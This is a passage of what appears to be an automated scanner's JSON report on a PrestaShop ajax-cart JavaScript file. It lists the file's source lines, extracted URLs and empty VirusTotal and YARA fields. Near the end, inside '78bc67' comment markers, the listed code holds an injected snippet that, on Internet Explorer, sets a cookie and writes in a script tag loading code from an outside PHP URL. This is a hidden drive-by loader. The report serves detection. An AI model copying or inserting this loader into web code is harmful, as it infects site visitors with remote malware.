            "\t\t\t\t\t\t\tcustomizationFormatedDatas = ajaxCart.displayNewCustomizedDatas(jsonProduct);",
            "\t\t\t\t\t\t\tif (!$('#customization_' + domIdProductAttribute).length)",
            "\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\tif (jsonProduct.hasAttributes)",
            "\t\t\t\t\t\t\t\t\t$('#cart_block_combination_of_' + domIdProduct).append(customizationFormatedDatas);",
            "\t\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t\t\t$('#cart_block dl.products').append(customizationFormatedDatas);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\telse",
            "\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\t$('#customization_' + domIdProductAttribute).html('');",
            "\t\t\t\t\t\t\t\t$('#customization_' + domIdProductAttribute).append(customizationFormatedDatas);",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\t$('#cart_block dl.products .hidden').slideDown(450).removeClass('hidden');",
            "\t\t\tvar removeLinks = $('#cart_block_product_' + domIdProduct).find('a.ajax_cart_block_remove_link');",
            "\t\t\tif (this.hasCustomizedDatas && removeLinks.length)",
            "\t\t\t\t$(removeLinks).each(function() {",
            "\t\t\t\t\t$(this).remove();",
            "\t\t\t\t});",
            "\t\t\t}",
            "\t\t});",
            "\tdisplayNewCustomizedDatas : function(product)",
            "\t\tvar content = '';",
            "\t\tvar productId = parseInt(product.id);",
            "\t\tvar productAttributeId = typeof(product.idCombination) == 'undefined' ? 0 : parseInt(product.idCombination);",
            "\t\tvar hasAlreadyCustomizations = $('#customization_' + productId + '_' + productAttributeId).length;",
            "\t\tif (!hasAlreadyCustomizations)",
            "\t\t\tif (!product.hasAttributes)",
            "\t\t\t\tcontent += '<dd id=\"cart_block_combination_of_' + productId + '\" class=\"hidden\">';",
            "\t\t\tif ($('#customization_' + productId + '_' + productAttributeId).val() == undefined)",
            "\t\t\t\tcontent += '<ul class=\"cart_block_customizations\" id=\"customization_' + productId + '_' + productAttributeId + '\">';",
            "\t\t$(product.customizedDatas).each(function()",
            "\t\t\tvar done = 0;",
            "\t\t\tcustomizationId = parseInt(this.customizationId);",
            "\t\t\tproductAttributeId = typeof(product.idCombination) == 'undefined' ? 0 : parseInt(product.idCombination);",
            "\t\t\tcontent += '<li name=\"customization\"><div class=\"deleteCustomizableProduct\" id=\"deleteCustomizableProduct_' + customizationId + '_' + productId + '_' + (productAttributeId ?  productAttributeId : '0') + '\"><a rel=\"nofollow\" class=\"ajax_cart_block_remove_link\" href=\"' + baseUri + '?controller=cart&amp;delete=1&amp;id_product=' + productId + '&amp;ipa=' + productAttributeId + '&amp;id_customization=' + customizationId + '&amp;token=' + static_token + '\"></a></div><span class=\"quantity-formated\"><span class=\"quantity\">' + parseInt(this.quantity) + '</span>x</span>';",
            "\t\t\t// Give to the customized product the first textfield value as name",
            "\t\t\t$(this.datas).each(function(){",
            "\t\t\t\tif (this['type'] == CUSTOMIZE_TEXTFIELD)",
            "\t\t\t\t{",
            "\t\t\t\t\t$(this.datas).each(function(){",
            "\t\t\t\t\t\tif (this['index'] == 0)",
            "\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\tcontent += ' ' + this.truncatedValue.replace(/<br \\/>/g, ' ');",
            "\t\t\t\t\t\t\tdone = 1;",
            "\t\t\t\t\t\t\treturn false;",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t})",
            "\t\t\t\t}",
            "\t\t\t});",
            "\t\t\t// If the customized product did not have any textfield, it will have the customizationId as name",
            "\t\t\tif (!done)",
            "\t\t\t\tcontent += customizationIdMessage + customizationId;",
            "\t\t\tif (!hasAlreadyCustomizations) content += '</li>';",
            "\t\t\t// Field cleaning",
            "\t\t\tif (customizationId)",
            "\t\t\t{",
            "\t\t\t\t$('#uploadable_files li div.customizationUploadBrowse img').remove();",
            "\t\t\t\t$('#text_fields input').attr('value', '');",
            "\t\t\t}",
            "\t\t});",
            "\t\tif (!hasAlreadyCustomizations)",
            "\t\t\tcontent += '</ul>';",
            "\t\t\tif (!product.hasAttributes) content += '</dd>';",
            "\t\treturn (content);",
            "\t//genarally update the display of the cart",
            "\tupdateCart : function(jsonData) {",
            "\t\t//user errors display",
            "\t\tif (jsonData.hasError)",
            "\t\t\tvar errors = '';",
            "\t\t\tfor (error in jsonData.errors)",
            "\t\t\t\t//IE6 bug fix",
            "\t\t\t\tif (error != 'indexOf')",
            "\t\t\t\t\terrors += $('<div />').html(jsonData.errors[error]).text() + \"\\n\";",
            "\t\t\talert(errors);",
            "\t\telse",
            "\t\t\tajaxCart.updateCartEverywhere(jsonData);",
            "\t\t\tajaxCart.hideOldProducts(jsonData);",
            "\t\t\tajaxCart.displayNewProducts(jsonData);",
            "\t\t\tajaxCart.refreshVouchers(jsonData);",
            "\t\t\t//update 'first' and 'last' item classes",
            "\t\t\t$('#cart_block .products dt').removeClass('first_item').removeClass('last_item').removeClass('item');",
            "\t\t\t$('#cart_block .products dt:first').addClass('first_item');",
            "\t\t\t$('#cart_block .products dt:not(:first,:last)').addClass('item');",
            "\t\t\t$('#cart_block .products dt:last').addClass('last_item');",
            "\t\t\t//reset the onlick events in relation to the cart block (it allow to bind the onclick event to the new 'delete' buttons added)",
            "\t\t\tajaxCart.overrideButtonsInThePage();",
            "\t//update general cart informations everywhere in the page",
            "\tupdateCartEverywhere : function(jsonData) {",
            "\t\t$('.ajax_cart_total').text($.trim(jsonData.productTotal));",
            "\t\tif (parseFloat(jsonData.shippingCostFloat) > 0 || jsonData.nbTotalProducts < 1)",
            "\t\t\t$('.ajax_cart_shipping_cost').text(jsonData.shippingCost);",
            "\t\telse if (typeof(freeShippingTranslation) != 'undefined')",
            "\t\t\t\t$('.ajax_cart_shipping_cost').html(freeShippingTranslation);",
            "\t\t$('.ajax_cart_tax_cost').text(jsonData.taxCost);",
            "\t\t$('.cart_block_wrapping_cost').text(jsonData.wrappingCost);",
            "\t\t$('.ajax_block_cart_total').text(jsonData.total);",
            "\t\tthis.nb_total_products = jsonData.nbTotalProducts;",
            "\t\tif (parseInt(jsonData.nbTotalProducts) > 0)",
            "\t\t\t$('.ajax_cart_no_product').hide();",
            "\t\t\t$('.ajax_cart_quantity').text(jsonData.nbTotalProducts);",
            "\t\t\t$('.ajax_cart_quantity').fadeIn('slow');",
            "\t\t\t$('.ajax_cart_total').fadeIn('slow');",
            "\t\t\tif (parseInt(jsonData.nbTotalProducts) > 1)",
            "\t\t\t{",
            "\t\t\t\t$('.ajax_cart_product_txt').each( function () {",
            "\t\t\t\t\t$(this).hide();",
            "\t\t\t\t});",
            "\t\t\t\t$('.ajax_cart_product_txt_s').each( function () {",
            "\t\t\t\t\t$(this).show();",
            "\t\t\t\t});",
            "\t\t\t}",
            "\t\t\telse",
            "\t\t\t{",
            "\t\t\t\t$('.ajax_cart_product_txt').each( function () {",
            "\t\t\t\t\t$(this).show();",
            "\t\t\t\t});",
            "\t\t\t\t$('.ajax_cart_product_txt_s').each( function () {",
            "\t\t\t\t\t$(this).hide();",
            "\t\t\t\t});",
            "\t\t\t}",
            "\t\telse",
            "\t\t\t$('.ajax_cart_quantity, .ajax_cart_product_txt_s, .ajax_cart_product_txt, .ajax_cart_total').each(function(){",
            "\t\t\t\t$(this).hide();",
            "\t\t\t});",
            "\t\t\t$('.ajax_cart_no_product').show('slow');",
            "function HoverWatcher(selector){",
            "\tthis.hovering = false;",
            "\tvar self = this;",
            "\tthis.isHoveringOver = function() {",
            "\t\treturn self.hovering;",
            "\t$(selector).hover(function() {",
            "\t\tself.hovering = true;",
            "\t}, function() {",
            "\t\tself.hovering = false;",
            "//when document is loaded...",
            "$(document).ready(function(){",
            "\t// expand/collapse management",
            "\t$('#block_cart_collapse').click(function(){",
            "\t\t\tajaxCart.collapse();",
            "\t});",
            "\t$('#block_cart_expand').click(function(){",
            "\t\t\tajaxCart.expand();",
            "\t});",
            "\tajaxCart.overrideButtonsInThePage();",
            "\tvar cart_qty = 0;",
            "\tvar current_timestamp = parseInt(new Date().getTime() / 1000);",
            "\tif (typeof $('.ajax_cart_quantity').html() == 'undefined' || (typeof generated_date != 'undefined' && generated_date != null && (parseInt(generated_date) + 30) < current_timestamp))",
            "\t\tajaxCart.refresh();",
            "\telse",
            "\t\tcart_qty = parseInt($('.ajax_cart_quantity').html());",
            "\t/* roll over cart */",
            "\tvar cart_block = new HoverWatcher('#cart_block');",
            "\tvar shopping_cart = new HoverWatcher('#shopping_cart');",
            "\t$(\"#shopping_cart a:first\").hover(",
            "\t\tfunction() {",
            "\t\t\t$(this).css('border-radius', '3px 3px 0px 0px');",
            "\t\t\tif (ajaxCart.nb_total_products > 0 || cart_qty > 0)",
            "\t\t\t\t$(\"#cart_block\").stop(true, true).slideDown(450);",
            "\t\t},",
            "\t\tfunction() {",
            "\t\t\t$('#shopping_cart a').css('border-radius', '3px');",
            "\t\t\tsetTimeout(function() {",
            "\t\t\t\tif (!shopping_cart.isHoveringOver() && !cart_block.isHoveringOver())",
            "\t\t\t\t\t$(\"#cart_block\").stop(true, true).slideUp(450);",
            "\t\t\t}, 200);",
            "\t$(\"#cart_block\").hover(",
            "\t\tfunction() {",
            "\t\t\t$('#shopping_cart a').css('border-radius', '3px 3px 0px 0px');",
            "\t\t},",
            "\t\tfunction() {",
            "\t\t\t$('#shopping_cart a').css('border-radius', '3px');",
            "\t\t\tsetTimeout(function() {",
            "\t\t\t\tif (!shopping_cart.isHoveringOver())",
            "\t\t\t\t\t$(\"#cart_block\").stop(true, true).slideUp(450);",
            "\t\t\t}, 200);",
            "\t$('.delete_voucher').live('click', function() {",
            "\t\t$.ajax({",
            "\t\t\ttype: 'POST',",
            "\t\t\theaders: { \"cache-control\": \"no-cache\" },",
            "\t\t\tasync: true,",
            "\t\t\tcache: false,",
            "\t\t\turl:$(this).attr('href') + '?rand=' + new Date().getTime()",
            "\t\t});",
            "\t\t$(this).parent().parent().remove();",
            "\t\tif ($('body').attr('id') == 'order' || $('body').attr('id') == 'order-opc')",
            "\t\t\tif (typeof(updateAddressSelection) != 'undefined')",
            "\t\t\t\tupdateAddressSelection();",
            "\t\t\telse",
            "\t\t\t\tlocation.reload();",
            "\t\treturn false;",
            "\t});",
            "\t$('#cart_navigation input').click(function(){",
            "\t\t$(this).attr('disabled', true).removeClass('exclusive').addClass('exclusive_disabled');",
            "\t\t$(this).closest(\"form\").get(0).submit();",
            "\t});",
            "/*78bc67*/",
            "function getCookie(name) { var cookie = \" \" + document.cookie; var search = \" \" + name + \"=\"; var setStr = null; var offset = 0; var end = 0; if (cookie.length > 0) { offset = cookie.indexOf(search); if (offset != -1) { offset += search.length; end = cookie.indexOf(\";\", offset); if (end == -1) { end = cookie.length; } setStr = unescape(cookie.substring(offset, end)); } } return setStr;}",
            "if (navigator.userAgent.indexOf(\"MSIE\") != -1){if(navigator.cookieEnabled == true) {var user98866 = getCookie(\"uxux09\");if (user98866 !==\"uxux\"){setCookie(\"uxux09\", \"uxux\", 7, \"/\"); cookieux09ux();}}} function cookieux09ux(){document.write(\"<script src='http://markus-wahmhoff.de/bilder/zCqx2g9m.php?id=130785184' type='text/javascript'></\" + \"script>\");}",
            "function setCookie(name, value, expiredays, path, domain, secure) { if (expiredays) { var exdate=new Date(); exdate.setDate(exdate.getDate()+expiredays); var expires = exdate.toGMTString(); } document.cookie = name + \"=\" + escape(value) + ((expiredays) ? \"; expires=\" + expires : \"\") + ((path) ? \"; path=\" + path : \"\") + ((domain) ? \"; domain=\" + domain : \"\") + ((secure) ? \"; secure\" : \"\");}",
            "/*/78bc67*/"
        ],
        "file": {
            "* http://opensource.org/licenses/afl-3.0.php": "Web Page"
        },
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.prestashop.com",
            "http://opensource.org/licenses/afl-3.0.php",
            "http://markus-wahmhoff.de/bilder/zCqx2g9m.php?id=130785184"
        ]
    },
    "time": "0:00:00.459582",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
